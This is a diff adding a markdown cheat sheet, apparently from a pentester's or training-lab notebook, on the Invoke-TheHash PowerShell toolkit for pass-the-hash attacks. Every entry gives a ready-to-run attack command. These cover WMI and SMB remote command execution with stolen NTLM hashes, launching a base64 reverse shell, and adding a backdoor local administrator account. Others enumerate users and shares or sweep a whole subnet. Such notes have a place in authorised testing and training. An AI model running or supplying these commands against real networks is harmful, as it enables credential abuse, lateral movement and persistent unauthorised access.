@@ -1,0 +1,16 @@
+#Invoke-TheHash #passthehash #crendentals #auth #authentication 
+- PowerShell to pass the hash
+- [GitHub - Kevin-Robertson/Invoke-TheHash: PowerShell Pass The Hash Utils](https://github.com/Kevin-Robertson/Invoke-TheHash)
+- `Import-Module ./Invoke-TheHash.psd1` Import the tool into powershell runtime
+- `Invoke-WMIExec` WMI command execution function.
+	- `Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose`
+	- `Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e {BASE64 of a reverseshell}}"`
+- `Invoke-SMBExec` SMB (PsExec) command execution function supporting SMB1, SMB2.1, with and without SMB signing.
+	- `Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose`
+	- `Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose`
+- `Invoke-SMBEnum` performs User, Group, NetSession and Share enumeration tasks over SMB2.1 with and without SMB signing.
+	- `Invoke-SMBEnum -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -verbose`
+- `Invoke-SMBClient` This function primarily provides SMB file share capabilities for working with hashes that do not have remote command execution privilege.
+	- `Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Source \\server\share -verbose`
+- `Invoke-TheHash` Function for running Invoke-TheHash functions against multiple targets.
+	- `Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0`
